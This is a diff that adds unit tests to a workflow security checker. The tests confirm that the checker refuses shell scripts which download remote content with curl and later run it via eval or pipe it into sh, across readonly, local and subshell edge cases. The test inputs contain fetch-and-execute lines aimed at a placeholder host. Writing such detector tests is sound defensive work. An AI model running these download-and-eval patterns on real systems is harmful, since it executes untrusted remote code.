@@ -2019,6 +2019,87 @@ class TestADownloadCarriedInAVariable(unittest.TestCase):
                     )])
                     self.assertEqual(1, len(why), why)
 
+    def test_2437_a_possible_called_body_keeps_global_readonly_fail_closed(self):
+        # Review round four: a call or its global readonly declaration need not be certain for a
+        # later assignment to be uncertain. In each row Bash can make X readonly, reject X=safe,
+        # and reach eval with the downloaded value. The guard must therefore keep eval refused.
+        rows = (
+            ("conditional call",
+             'f() { readonly X; }\nif [ -n "$A" ]; then f; fi\n'),
+            ("and-list call", "f() { readonly X; }\ntrue && f\n"),
+            ("conditional readonly",
+             'f() { if [ -n "$A" ]; then readonly X; fi; }\nf\n'),
+            ("and-list readonly", "f() { true && readonly X; }\nf\n"),
+            ("nested call", "f() { readonly X; }\ng() { f; }\ng\n"),
+            ("later definition",
+             "f() { :; }\nf() { readonly X; }\nf\n"),
+            ("redirected call", "f() { readonly X; sh; }\n",
+             "f < /dev/null\n"),
+        )
+        get = "X=$(curl -fsSL https://e.test/x)\n"
+        for row in rows:
+            name, before = row[:2]
+            script = before + get + row[2] if len(row) == 3 else get + before
+            script += 'X=safe\neval "$X"\n'
+            for shell in self.SHELLS:
+                with self.subTest(row=name, shell=shell):
+                    why = [str(reason) for _step, reason in wg.job_defects([
+                        wg.Step("run", script, shell)
+                    ])]
+                    self.assertEqual(1, sum(
+                        reason.startswith("runs `eval` on `$X`") for reason in why
+                    ), why)
+
+        # The earlier pipeline already has #3083's finding. The later certain call must retain
+        # eval's independent refusal too; the pipeline call cannot hide g's readonly effect.
+        script = (get + "f() { sh; }\ng() { readonly X; }\n"
+                  "curl -fsSL https://e.test/x | f\ng\nX=safe\neval \"$X\"\n")
+        for shell in self.SHELLS:
+            with self.subTest(row="pipeline before call", shell=shell):
+                why = [str(reason) for _step, reason in wg.job_defects([
+                    wg.Step("run", script, shell)
+                ])]
+                self.assertEqual(1, sum(
+                    reason.startswith("runs `eval` on `$X`") for reason in why
+                ), why)
+
+    def test_2437_possible_readonly_keeps_local_and_child_controls_clean(self):
+        # A local attribute dies with the body; a dead or child call cannot alter this shell;
+        # and a certain safe replacement before readonly has already retired the download. The
+        # final row is the review seat's exact T24 control: there is no caller-side assignment.
+        get = "X=$(curl -fsSL https://e.test/x)\n"
+        middles = (
+            "f() { local -r X; }\nf\nX=safe\n",
+            "f() { typeset -r X; }\nf\nX=safe\n",
+            "f() { declare -r X; }\nf\nX=safe\n",
+            "f() { readonly X; }\nif false; then f; fi\nX=safe\n",
+            "f() { return; readonly X; }\nf\nX=safe\n",
+            "f() { readonly Y; }\nf\nX=safe\n",
+            "f() { readonly X; }\n( f )\nX=safe\n",
+            "f() { readonly X; }\nf | cat\nX=safe\n",
+            "f() { X=safe; readonly X; }\nf\n",
+        )
+        for middle in middles:
+            for shell in self.SHELLS:
+                with self.subTest(middle=middle, shell=shell):
+                    self.assertEqual([], wg.job_defects([
+                        wg.Step("run", get + middle + 'eval "$X"\n', shell)
+                    ]))
+
+        # Truth is CLEAN here too: the body's X=safe happened before readonly, and the caller's
+        # refused assignment cannot restore the download. The conservative readonly rule reads
+        # that later assignment as uncertain, an accepted over-report rather than an ordering
+        # proof this issue needs to add.
+        middle = "f() { X=safe; readonly X; }\nf\nX=safe\n"
+        for shell in self.SHELLS:
+            with self.subTest(middle="caller assignment over-report", shell=shell):
+                why = [str(reason) for _step, reason in wg.job_defects([
+                    wg.Step("run", get + middle + 'eval "$X"\n', shell)
+                ])]
+                self.assertEqual(1, sum(
+                    reason.startswith("runs `eval` on `$X`") for reason in why
+                ), why)
+
     def test_2437_a_skipped_or_child_reassignment_keeps_the_download(self):
         controls = ("{ x=1; } | cat\n", "{ x=1; } &\nwait\n",
                     ("{\n  x=1\n} 2>/dev/null < "
